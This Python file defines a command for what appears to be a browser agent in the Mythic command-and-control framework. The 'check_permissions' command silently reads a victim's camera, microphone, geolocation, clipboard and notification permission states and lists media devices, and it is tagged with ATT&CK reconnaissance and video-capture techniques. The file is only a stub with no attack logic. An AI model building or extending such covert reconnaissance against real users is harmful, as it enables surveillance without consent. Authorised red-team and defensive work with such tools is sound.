from mythic_container.MythicCommandBase import (
    CommandBase, TaskArguments,
    MythicTask, PTTaskMessageAllData,
    PTTaskProcessResponseMessageResponse, CommandAttributes,
)


class CheckPermissionsArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = []

    async def parse_arguments(self):
        pass


class CheckPermissionsCommand(CommandBase):
    cmd            = "check_permissions"
    needs_admin    = False
    help_cmd       = "check_permissions"
    description    = (
        "Silently query browser permission state (camera, microphone, geolocation, "
        "notifications, clipboard) across all open tabs, grouped by origin. Also lists "
        "available media devices (labels visible only if camera/mic already granted). "
        "No dialogs or prompts are shown to the victim — read-only."
    )
    version        = 1
    author         = "@asaurusrex"
    argument_class = CheckPermissionsArguments
    attackmapping  = ["T1592", "T1125"]
    attributes     = CommandAttributes(filter_by_build_parameter={}, supported_os=[])

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        task.display_params = ""
        return task

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
